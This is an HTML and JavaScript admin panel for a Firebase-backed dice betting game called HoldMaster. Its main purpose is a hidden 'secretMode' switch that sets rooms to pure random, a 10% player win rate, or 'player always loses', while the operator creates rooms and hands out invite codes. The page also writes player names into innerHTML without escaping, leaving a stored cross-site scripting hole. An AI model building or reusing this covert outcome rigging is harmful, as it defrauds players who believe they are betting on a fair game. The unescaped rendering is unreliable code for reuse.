<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HoldMaster 管理后台</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1a1a2e;min-height:100vh;color:#fff;overflow-x:hidden}
.container{max-width:600px;margin:0 auto;padding:40px 20px}
h1{text-align:center;font-size:2em;margin-bottom:10px;color:#ffd700;text-shadow:0 0 20px rgba(255,215,0,0.5)}
.subtitle{text-align:center;opacity:.6;margin-bottom:40px;font-size:.9em}
.card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:30px;margin-bottom:20px}
.card h2{font-size:1.2em;margin-bottom:20px;color:#ffd700;display:flex;align-items:center;gap:10px}
.mode-grid{display:grid;grid-template-columns:1fr;gap:15px}
.mode-btn{padding:20px;border:2px solid rgba(255,255,255,.2);border-radius:15px;background:rgba(255,255,255,.05);color:#fff;font-size:1em;cursor:pointer;transition:all .3s;text-align:center}
.mode-btn:hover{background:rgba(255,255,255,.1);transform:translateY(-2px)}
.mode-btn.active{border-color:#ffd700;background:rgba(255,215,0,.15);box-shadow:0 0 20px rgba(255,215,0,.3)}
.mode-btn .emoji{font-size:2em;display:block;margin-bottom:8px}
.mode-btn .label{font-weight:bold}
.mode-btn .desc{font-size:.8em;opacity:.7;margin-top:5px}
.conn-status{position:fixed;top:20px;right:20px;font-size:.8em;padding:6px 12px;border-radius:15px;background:rgba(0,0,0,.5)}
.conn-status.ok{color:#51cf66;border:1px solid #51cf66}
.conn-status.err{color:#ff6b6b;border:1px solid #ff6b6b}

/* 创建房间 */
.create-btn{width:100%;padding:18px;font-size:1.1em;font-weight:700;color:#000;background:linear-gradient(145deg,#ffd700,#ffaa00);border:none;border-radius:15px;cursor:pointer;transition:all .3s;box-shadow:0 4px 15px rgba(255,215,0,.3)}
.create-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,215,0,.4)}
.create-btn:active{transform:scale(.98)}
.create-btn:disabled{opacity:.5;cursor:not-allowed}
.new-room-info{display:none;margin-top:20px;padding:20px;background:rgba(81,207,102,.15);border:1px solid rgba(81,207,102,.3);border-radius:15px;text-align:center}
.new-room-info.visible{display:block}
.new-room-info .invite-code{font-size:2.5em;font-weight:800;color:#51cf66;letter-spacing:8px;margin:10px 0;text-shadow:0 0 15px rgba(81,207,102,.5)}
.new-room-info .hint{font-size:.85em;opacity:.7}
.copy-btn{margin-top:12px;padding:10px 24px;font-size:.9em;color:#51cf66;background:rgba(81,207,102,.1);border:1px solid #51cf66;border-radius:10px;cursor:pointer;transition:all .2s}
.copy-btn:hover{background:rgba(81,207,102,.2)}

/* 房间列表 */
.room-list{display:flex;flex-direction:column;gap:10px}
.room-item{display:flex;justify-content:space-between;align-items:center;padding:15px;background:rgba(0,0,0,.2);border-radius:10px}
.room-item .room-code{font-size:1.2em;font-weight:700;color:#ffd700}
.room-item .room-info{font-size:.8em;opacity:.7;text-align:right}
.room-item .room-status{font-size:.8em;padding:3px 8px;border-radius:8px}
.room-item .room-status.active{background:rgba(81,207,102,.2);color:#51cf66}
.room-item .room-status.idle{background:rgba(255,255,255,.1);color:rgba(255,255,255,.5)}
.empty-state{text-align:center;padding:30px;opacity:.5;font-size:.9em}
</style>
</head>
<body>
<div class="conn-status" id="connStatus">连接中...</div>
<div class="container">
<h1>🎲 HoldMaster</h1>
<p class="subtitle">管理后台 - 游戏模式控制</p>

<div class="card">
<h2>🎯 全局默认模式</h2>
<p style="font-size:.8em;opacity:.5;margin-bottom:15px">新创建的房间将使用此模式</p>
<div class="mode-grid">
<button class="mode-btn active" data-mode="2" onclick="setMode(2)">
<span class="emoji">🎯</span>
<span class="label">纯随机</span>
<span class="desc">完全随机，公平对战</span>
</button>
<button class="mode-btn" data-mode="0" onclick="setMode(0)">
<span class="emoji">🎲</span>
<span class="label">10%胜率</span>
<span class="desc">玩家只有10%胜率</span>
</button>
<button class="mode-btn" data-mode="1" onclick="setMode(1)">
<span class="emoji">💀</span>
<span class="label">玩家必输</span>
<span class="desc">玩家永远赢不了</span>
</button>
</div>
</div>

<div class="card">
<h2>➕ 创建房间</h2>
<button class="create-btn" id="createBtn" onclick="createRoom()">🏠 创建新房间</button>
<div class="new-room-info" id="newRoomInfo">
  <div class="hint">邀请码</div>
  <div class="invite-code" id="inviteCodeDisplay"></div>
  <button class="copy-btn" onclick="copyCurrentCode()">复制邀请码</button>
</div>
</div>

<div class="card">
<h2>🏠 活跃房间</h2>
<div class="room-list" id="roomList">
<div class="empty-state">暂无活跃房间</div>
</div>
</div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, set, get, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyC1GwYRgXZ8DfTQ52PZ_KtWRtqa3DMtVlI",
  authDomain: "holdmaster-11c61.firebaseapp.com",
  projectId: "holdmaster-11c61",
  storageBucket: "holdmaster-11c61.firebasestorage.app",
  messagingSenderId: "341270683153",
  appId: "1:341270683153:web:15666c97e4fd9918b15bb0",
  measurementId: "G-0W2381KYG1",
  databaseURL: "https://holdmaster-11c61-default-rtdb.asia-southeast1.firebasedatabase.app"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let secretMode = 2;
let currentCode = '';

function setConnStatus(ok) {
  const el = document.getElementById('connStatus');
  el.textContent = ok ? '✅ 已连接' : '❌ 连接断开';
  el.className = 'conn-status ' + (ok ? 'ok' : 'err');
}

function updateModeButtons() {
  document.querySelectorAll('.mode-btn').forEach(btn => {
    btn.classList.toggle('active', parseInt(btn.dataset.mode) === secretMode);
  });
}

window.setMode = function(m) {
  secretMode = m;
  set(ref(db, 'boss/mode'), m).then(() => {
    updateModeButtons();
    console.log('模式已设置:', m);
  }).catch(err => {
    console.error('设置模式失败:', err);
    alert('设置模式失败: ' + err.message);
  });
};

function generateInviteCode() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

window.createRoom = async function() {
  const btn = document.getElementById('createBtn');
  btn.disabled = true;
  btn.textContent = '创建中...';
  
  try {
    let code = generateInviteCode();
    
    // 确保唯一
    for (let i = 0; i < 100; i++) {
      const snap = await get(ref(db, 'rooms/' + code));
      if (!snap.exists()) break;
      code = generateInviteCode();
    }
    
    // 创建房间
    await set(ref(db, 'rooms/' + code), {
      mode: secretMode,
      createdAt: Date.now(),
      status: 'waiting',
      game: {
        phase: 'idle',
        round: 0,
        playerD1: 1,
        playerD2: 1,
        bossD1: 1,
        bossD2: 1,
        betType: '',
        betAmount: 0,
        resultOutcome: '',
        resultText: '',
        resultDetail: ''
      }
    });
    
    // 保存并显示邀请码
    currentCode = code;
    const info = document.getElementById('newRoomInfo');
    const codeDisplay = document.getElementById('inviteCodeDisplay');
    info.classList.add('visible');
    codeDisplay.textContent = code;
    
    // 复制到剪贴板
    try {
      await navigator.clipboard.writeText(code);
      document.querySelector('#newRoomInfo .hint').textContent = '✅ 邀请码已复制到剪贴板';
    } catch (e) {
      document.querySelector('#newRoomInfo .hint').textContent = '请手动复制邀请码';
    }
    
    console.log('房间创建成功:', code);
  } catch (err) {
    console.error('创建房间失败:', err);
    alert('创建房间失败: ' + err.message);
  } finally {
    btn.disabled = false;
    btn.textContent = '🏠 创建新房间';
  }
};

window.copyCurrentCode = async function() {
  if (!currentCode) {
    alert('没有可复制的邀请码');
    return;
  }
  try {
    await navigator.clipboard.writeText(currentCode);
    alert('已复制: ' + currentCode);
  } catch (e) {
    alert('邀请码: ' + currentCode);
  }
};

window.copyCode = async function(code) {
  try {
    await navigator.clipboard.writeText(code);
    alert('已复制: ' + code);
  } catch (e) {
    alert('邀请码: ' + code);
  }
};

// 监听全局模式
onValue(ref(db, 'boss/mode'), (snap) => {
  secretMode = snap.val() != null ? snap.val() : 2;
  updateModeButtons();
  setConnStatus(true);
}, (err) => {
  console.error('监听模式失败:', err);
  setConnStatus(false);
});

// 监听房间列表
onValue(ref(db, 'rooms'), (snap) => {
  const list = document.getElementById('roomList');
  if (!snap.exists()) {
    list.innerHTML = '<div class="empty-state">暂无活跃房间</div>';
    return;
  }

  list.innerHTML = '';
  snap.forEach((child) => {
    const room = child.val();
    const roomCode = child.key;
    const player = room.player || {};
    const game = room.game || {};
    const modeNames = ['10%胜率', '玩家必输', '纯随机'];
    const mode = room.mode != null ? room.mode : secretMode;
    const phase = game.phase || 'idle';
    const phaseNames = { idle: '等待中', roll1: '投骰子', betting: '下注', roll2: '投骰子', result: '本局结束' };
    const isPlaying = phase !== 'idle';

    const div = document.createElement('div');
    div.className = 'room-item';
    div.innerHTML = `
      <div>
        <div class="room-code">#${roomCode}</div>
        <div class="room-info">${player.name || '等待玩家...'} | ${phaseNames[phase] || phase}</div>
      </div>
      <div style="text-align:right">
        <div class="room-status ${isPlaying ? 'active' : 'idle'}">${modeNames[mode]}</div>
        <button class="copy-btn" style="margin-top:8px;padding:5px 12px;font-size:.75em" onclick="copyCode('${roomCode}')">复制</button>
      </div>
    `;
    list.appendChild(div);
  });
}, (err) => {
  console.error('监听房间失败:', err);
});

setConnStatus(true);
</script>
</body>
</html>
